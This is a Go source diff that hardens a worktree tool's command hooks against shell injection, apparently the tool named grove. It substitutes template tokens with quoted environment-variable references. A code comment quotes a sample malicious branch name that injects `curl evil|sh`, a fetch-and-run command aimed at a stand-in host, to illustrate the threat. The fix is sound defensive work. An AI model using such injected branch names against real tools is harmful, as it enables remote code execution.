@@ -230,6 +230,66 @@ func (v *Variables) Interpolate(s string) string {
 	return r.Replace(s)
 }
 
+// shellVarBinding ties a template token to the environment variable that
+// carries its value into a command hook's shell.
+type shellVarBinding struct {
+	token string // e.g. "{{.branch}}"
+	env   string // e.g. "GROVE_HOOK_branch"
+	value string
+}
+
+// shellVarBindings returns the ordered token→env→value tuples shared by
+// InterpolateShell and ShellEnv so the rewritten command and the environment
+// it runs in never drift apart.
+func (v *Variables) shellVarBindings() []shellVarBinding {
+	return []shellVarBinding{
+		{"{{.worktree}}", "GROVE_HOOK_worktree", v.Worktree},
+		{"{{.worktree_full}}", "GROVE_HOOK_worktree_full", v.WorktreeFull},
+		{"{{.branch}}", "GROVE_HOOK_branch", v.Branch},
+		{"{{.project}}", "GROVE_HOOK_project", v.Project},
+		{"{{.main_path}}", "GROVE_HOOK_main_path", v.MainPath},
+		{"{{.new_path}}", "GROVE_HOOK_new_path", v.NewPath},
+		{"{{.prev_path}}", "GROVE_HOOK_prev_path", v.PrevPath},
+		{"{{.port}}", "GROVE_HOOK_port", fmt.Sprintf("%d", v.Port)},
+		{"{{.user}}", "GROVE_HOOK_user", v.User},
+		{"{{.timestamp}}", "GROVE_HOOK_timestamp", fmt.Sprintf("%d", v.Timestamp)},
+		{"{{.date}}", "GROVE_HOOK_date", v.Date},
+	}
+}
+
+// InterpolateShell rewrites a command-hook string for safe execution via
+// `sh -c`. Each {{.x}} token is replaced with a *quoted environment-variable
+// reference* ("${GROVE_HOOK_x}") rather than the literal value, and the real
+// values are supplied out-of-band via ShellEnv. The shell expands the
+// reference as opaque data, so metacharacters in a value can never inject a
+// command — critical because grove interpolates values it doesn't control
+// (notably {{.branch}}, and grove checks out branches from untrusted PRs via
+// `grove fetch pr/<N>`, so a branch named `x";curl evil|sh;"` must not run).
+// Quoting the reference keeps it safe even when the template embeds the token
+// inside its own quotes, e.g. echo "switched to {{.branch}}".
+//
+// Interpolate (literal substitution) remains correct for filesystem paths and
+// template bodies, which Go handles directly and which never reach a shell.
+func (v *Variables) InterpolateShell(s string) string {
+	bindings := v.shellVarBindings()
+	pairs := make([]string, 0, len(bindings)*2)
+	for _, b := range bindings {
+		pairs = append(pairs, b.token, `"${`+b.env+`}"`)
+	}
+	return strings.NewReplacer(pairs...).Replace(s)
+}
+
+// ShellEnv returns the GROVE_HOOK_*=value assignments that back the references
+// InterpolateShell emits, for appending to a command hook's environment.
+func (v *Variables) ShellEnv() []string {
+	bindings := v.shellVarBindings()
+	env := make([]string, 0, len(bindings))
+	for _, b := range bindings {
+		env = append(env, b.env+"="+b.value)
+	}
+	return env
+}
+
 // builtinCopy performs a copy action
 func builtinCopy(action *HookAction, ctx *ExecutionContext, vars *Variables) error {
 	from := vars.Interpolate(action.From)
@@ -303,7 +363,10 @@ func builtinSymlink(action *HookAction, ctx *ExecutionContext, vars *Variables) 
 
 // builtinCommand performs a command action
 func builtinCommand(action *HookAction, ctx *ExecutionContext, vars *Variables) error {
-	command := vars.Interpolate(action.Command)
+	// Shell-safe interpolation: the command is executed via `sh -c`, so
+	// interpolated values (branch names in particular) must be quoted to
+	// prevent command injection. See Variables.InterpolateShell.
+	command := vars.InterpolateShell(action.Command)
 
 	var workDir string
 	switch action.WorkingDir {
@@ -319,7 +382,7 @@ func builtinCommand(action *HookAction, ctx *ExecutionContext, vars *Variables) 
 	start := time.Now()
 
 	w := ctx.Out()
-	if err := runCommand(command, workDir, timeout, w, w); err != nil {
+	if err := runCommand(command, workDir, timeout, vars.ShellEnv(), w, w); err != nil {
 		return fmt.Errorf("command '%s': %w", command, err)
 	}
 
